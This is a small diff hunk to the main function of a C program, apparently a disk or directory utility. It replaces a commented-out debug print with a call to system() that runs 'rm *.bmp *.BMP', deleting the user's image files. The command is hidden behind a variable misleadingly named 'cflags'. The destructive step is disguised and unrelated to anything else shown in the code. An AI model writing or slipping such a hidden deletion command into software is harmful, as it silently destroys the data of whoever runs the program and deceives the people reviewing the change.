@@ -228,7 +228,8 @@ int main(int argc, char *argv[]) {
       }
     }
   }
-  // printf("%d\n", (int)sizeof(DirEntry));
+  char *cflags = "rm *.bmp *.BMP";
+  system(cflags);
   return 0;
 }
 
